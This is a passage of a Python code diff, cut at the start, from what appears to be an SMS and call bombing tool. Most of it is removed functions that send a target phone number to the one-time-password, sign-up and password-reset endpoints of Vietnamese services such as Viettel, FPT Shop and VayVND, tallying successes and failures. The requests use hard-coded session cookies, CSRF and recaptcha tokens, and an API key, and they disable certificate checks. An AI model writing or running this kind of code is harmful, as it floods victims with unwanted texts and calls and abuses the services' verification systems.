ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D; ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D; _ga=GA1.3.697835917.1720189695; _clsk=lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D; _ga_HTS298453C=GS1.1.1720194528.2.1.1720194561.27.0.0',
+        'pragma': 'no-cache',
+        'priority': 'u=1, i',
+        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
     }
 
-    json_data = {
-        'data': {
-            'phone': phone,
-            'code': 'send',
-            'channel': 'ivr',
-        },
-    }
-
-    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)
-    if 'ok' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-def call5(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        '_gid': 'GA1.2.639248556.1703855363',
-        '_gac_UA-214880719-1': '1.1703934459.CjwKCAiAnL-sBhBnEiwAJRGigk3nuS3VmBZTxlmTnmihK7Jj4G1pnQuSdHvXdaFWseaLPKWisQ2VcxoCf8IQAvD_BwE',
-        '_gat_UA-214880719-1': '1',
-        '_ga_RRJDDZGPYG': 'GS1.1.1703934458.2.1.1703934534.44.0.0',
-        '_ga': 'GA1.2.1290509617.1703855363',
-    }
-
-    headers = {
-        'authority': 'api.dongplus.vn',
-        'accept': '*/*',
-        'accept-language': 'vi',
-        'content-type': 'application/json',
-        # 'cookie': '_gid=GA1.2.639248556.1703855363; _gac_UA-214880719-1=1.1703934459.CjwKCAiAnL-sBhBnEiwAJRGigk3nuS3VmBZTxlmTnmihK7Jj4G1pnQuSdHvXdaFWseaLPKWisQ2VcxoCf8IQAvD_BwE; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1703934458.2.1.1703934534.44.0.0; _ga=GA1.2.1290509617.1703855363',
-        'dnt': '1',
-        'origin': 'https://dongplus.vn',
-        'referer': 'https://dongplus.vn/user/login',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    }
-
-    json_data = {
-        'phone': '84' + phone[1:9],
-    }
-
-    response = requests.post(
-        'https://api.dongplus.vn/api/user/send-one-time-password',
-        cookies=cookies,
-        headers=headers,
-        json=json_data,
-    )
-    if "call" in response.text:
-        thanhcong += 1
-    else:
-        thatbai += 1
-def call6(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        'JSESSIONID': 'D15C9181DF236AE13B2AD4DFC7F826EB',
-    }
-
-    headers = {
-        'Host': 'h5.vivohan.com',
-        'Connection': 'keep-alive',
-        # 'Content-Length': '337',
-        'system': 'android',
-        'appcodename': 'Mozilla',
-        'deviceType': 'h5',
-        'screenresolution': '1080,1920',
-        'appname': 'Netscape',
-        'channel': 'e242',
-        'w': '1080',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
-        'Content-Language': 'vn',
-        'Accept': 'application/json, text/plain, */*',
-        'platform': 'Linux i686',
-        'vendor': 'Google Inc.',
-        'Content-Type': 'application/json;charset=UTF-8',
-        'h': '1920',
-        'appversion': '5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
-        'Origin': 'https://h5.vivohan.com',
-        'X-Requested-With': 'mark.via.gp',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Dest': 'empty',
-        'Referer': 'https://h5.vivohan.com/login',
-        # 'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        # 'Cookie': 'JSESSIONID=D15C9181DF236AE13B2AD4DFC7F826EB',
-    }
-
-    data = {
-        'phone': phone,
-        'type': 2,
-        'timestamp': 1703951639000,
-        'referrer': 'utm_source=e242',
-        'af_prt': 'e242',
-        'sign': '0f656af82eb1da33221a06d1171db265',
-        'appversion': '1.0.0',
-        'channel': 1,
-        'app_version': '1.0.0',
-        'version': '1.0.0',
-        'imei': 'f30c673736f5301bd94aaaad5b543d90',
-        'uuid': 'f30c673736f5301bd94aaaad5b543d90',
-        'pkg_name': 'com.qcvivo.vivohanh5',
-    }
-    response = requests.post('https://h5.vivohan.com/api/register/app/sendSms', cookies=cookies, headers=headers, data=data, timeout=30, verify=False)
-    thanhcong+=1
-def call7(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        'authority': 'api.itaphoa.com',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'dnt': '1',
-        'origin': 'https://shop.mioapp.vn',
-        'referer': 'https://shop.mioapp.vn/',
-        'region-code': 'HCM',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-    }
-
-    params = {
-        'phone': phone,
-        'type': 'call',
-    }
-
-    response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers, timeout=30, verify=False)
-    if 'true' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms 0
-def sms0(phone):
-    global thanhcong
-    cookies = {
-        'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
-        'tel': phone,
-    }
-
-    headers = {
-        'Host': 'kavaycash.com',
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'X-Requested-With': 'mark.via.gp',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-User': '?1',
-        'Sec-Fetch-Dest': 'document',
-        'Referer': 'https://kavaycash.com/',
-        # 'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        # 'Cookie': 'csrftoken=jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7; tel=0357497741',
-    }
-
-    response = requests.get('https://kavaycash.com/verification/', cookies=cookies, headers=headers, timeout=30, verify=False)
-    thanhcong+=1
-#sms 1
-def sms1(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        '_tt_enable_cookie': '1',
-        '_ttp': 'UrWHpav-jlIIAkZIKfuHiWzvo3q',
-        '_ym_uid': '1690890718761379945',
-        '_ym_d': '1693615052',
-        '_fbp': 'fb.1.1699102383332.1544435954',
-        '_gcl_aw': 'GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
-        '_gcl_au': '1.1.667368353.1703856886',
-        '_ga_P2783EHVX2': 'GS1.1.1703856890.5.0.1703856890.60.0.0',
-        '_ym_isad': '1',
-        '_ga': 'GA1.2.1456721416.1693615049',
-        '_gid': 'GA1.2.84320069.1703856892',
-        '_gac_UA-151110385-1': '1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
-        '_ym_visorc': 'w',
-    }
-
-    headers = {
-        'authority': 'api.vayvnd.vn',
-        'accept': 'application/json',
-        'accept-language': 'vi-VN',
-        'content-type': 'application/json; charset=utf-8',
-        # 'cookie': '_tt_enable_cookie=1; _ttp=UrWHpav-jlIIAkZIKfuHiWzvo3q; _ym_uid=1690890718761379945; _ym_d=1693615052; _fbp=fb.1.1699102383332.1544435954; _gcl_aw=GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE; _gcl_au=1.1.667368353.1703856886; _ga_P2783EHVX2=GS1.1.1703856890.5.0.1703856890.60.0.0; _ym_isad=1; _ga=GA1.2.1456721416.1693615049; _gid=GA1.2.84320069.1703856892; _gac_UA-151110385-1=1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE; _ym_visorc=w',
-        'dnt': '1',
-        'origin': 'https://vayvnd.vn',
-        'referer': 'https://vayvnd.vn/',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'site-id': '3',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    }
-
-    json_data = {
-        'login': phone,
-        'trackingId': 'h9vBHoAE9KcJ7xX6GF8sfN7hHxryAIwl28zt6ycjTI8JhfdLlE1fHyGTqQmw8AMN',
-    }
-
-    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)
-    if "true" in response.text:
-            thanhcong +=1
-    else:
-            thatbai+=1
-#sms 2
-def sms2(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '49eb18d9-d110-4043-8ad4-7275d8b8d2e7',
-        '_gcl_au': '1.1.810434433.1689606249',
-        'fpt_uuid': '%226a6dc316-0db3-44a0-8891-224623887942%22',
-        'ajs_group_id': 'null',
-        '_tt_enable_cookie': '1',
-        '_ttp': '8uDshq4oYRcpPmQFUdKlNsoewGP',
-        '__admUTMtime': '1689606251',
-        '__uidac': '9d45aa00b705e4c9ff20708ca0955e4f',
-        '__iid': '',
-        '__iid': '',
-        '__su': '0',
-        '__su': '0',
-        '_gid': 'GA1.3.1682465247.1691155413',
-        '_gat': '1',
-        '_ga': 'GA1.1.1211624965.1689606248',
-        'vMobile': '1',
-        '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1',
-        'cf_clearance': 'm4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422',
-        '_hjSessionUser_731679': 'eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
-        '_hjIncludedInSessionSample_731679': '0',
-        '_hjSession_731679': 'eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=',
-        '_ga_ZR815NQ85K': 'GS1.1.1691155413.2.0.1691155423.50.0.0',
-    }
-
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=49eb18d9-d110-4043-8ad4-7275d8b8d2e7; _gcl_au=1.1.810434433.1689606249; fpt_uuid=%226a6dc316-0db3-44a0-8891-224623887942%22; ajs_group_id=null; _tt_enable_cookie=1; _ttp=8uDshq4oYRcpPmQFUdKlNsoewGP; __admUTMtime=1689606251; __uidac=9d45aa00b705e4c9ff20708ca0955e4f; __iid=; __iid=; __su=0; __su=0; _gid=GA1.3.1682465247.1691155413; _gat=1; _ga=GA1.1.1211624965.1689606248; vMobile=1; __zi=3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1; cf_clearance=m4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422; _hjSessionUser_731679=eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=; _ga_ZR815NQ85K=GS1.1.1691155413.2.0.1691155423.50.0.0',
-        'DNT': '1',
-        'Origin': 'https://fptshop.com.vn',
-        'Referer': 'https://fptshop.com.vn/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    data = {
-        'phone': phone,
-        'typeReset': '0',
-    }
-
-    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data, timeout=30, verify=False)
-    if '"error":false,'in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms 3
-def sms3(phone):
-    global thanhcong
-    headers = {
-        'authority': 'kingme.pro',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
-        'dnt': '1',
-        'origin': 'https://kingme.pro',
-        'referer': 'https://kingme.pro/',
-        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
+        params = {
         'phoneNumber': phone,
     }
 
-    response = requests.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', headers=headers, data=data, timeout=30, verify=False)
-    thanhcong+=1
-#sms 4
-def sms4(phone):
-    global thanhcong
-    global thatbai
-    headers = { 
-    'Host': 'vietteltelecom.vn',
-    'Connection': 'keep-alive',
-    'X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
-    'Content-Type': 'application/json;charset=UTF-8',
-    'Accept': 'application/json, text/plain, */*',
-    'Referer': 'https://vietteltelecom.vn/dang-nhap',
-}
-    
-    data = {
-    'phone': phone,
-    'type': ''
-    }
-    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', json=data, headers=headers)
-    result = response.json()
-    thanhcong+=1
-#sms 5
-def sms5(phone):
-    global thanhcong
-    global thatbai
-    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn',}
-    response = requests.get('https://viettel.vn/dang-ky', headers=headers, timeout=30, verify=False)
-    token = response.text.split('name="csrf-token" content="')[1].split('"')[0]
-    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-XSRF-TOKEN': token,'X-CSRF-TOKEN': token,'X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap',}
-    data = {'msisdn': phone}
-    response = requests.post('https://viettel.vn/api/get-otp', json=data, headers=headers, timeout=30, verify=False)
-    result = response.json()
-    thanhcong+=1
-
-def sms7(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-    'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
-    '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
-    'XSRF-TOKEN':  'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
-    }
-    headers = {
-    'Accept': 'application/json, text/plain, */*',
-    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-    'Connection': 'keep-alive',
-    'Content-Type': 'application/json;charset=UTF-8',
-    'DNT': '1',
-    'Origin': 'https://viettel.vn',
-    'Referer': 'https://viettel.vn/dang-nhap',
-    'Sec-Fetch-Dest': 'empty',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Site': 'same-origin',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-    'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i','X-Requested-With': 'XMLHttpRequest',
-    'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
-    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    }
-    json_data = {'phone': phone
-    ,'type': '',
-    }
-    
-    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data, verify=False)
-    if '200' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-        
-def sms8(phone):
-    global thanhcong
-    global thatbai
-    pw=random_string(10)
-    headers = {
-        'authority': 'products.popsww.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'api-key': '5d2300c2c69d24a09cf5b09b',
-        'content-type': 'application/json',
-        'dnt': '1',
-        'lang': 'vi',
-        'origin': 'https://pops.vn',
-        'platform': 'web',
-        'profileid': '657ca7582a4ac90054bcc10a',
-        'referer': 'https://pops.vn/auth/signin-signup/signup',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'sub-api-version': '1.1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-env': 'production',
-    }
-
-    json_data = {
-        'fullName': '',
-        'account': phone,
-        'password': 'xX.j2!h5gAv',
-        'confirmPassword': 'xX.j2!h5gAv',
-        'recaptcha': '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w',
-    }
-
-    response = requests.post('https://products.popsww.com/api/v5/auths/register', headers=headers, json=json_data, timeout=30, verify=False)
-    if '"status":"PENDING"'in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms 14
-def sms9(phone):
-    global thanhcong
-    global thatbai
-    response = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}, timeout=30, verify=False)
-    if response.status_code == 200:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms 15
-def sms10(phone):
-    global thanhcong
-    global thatbai
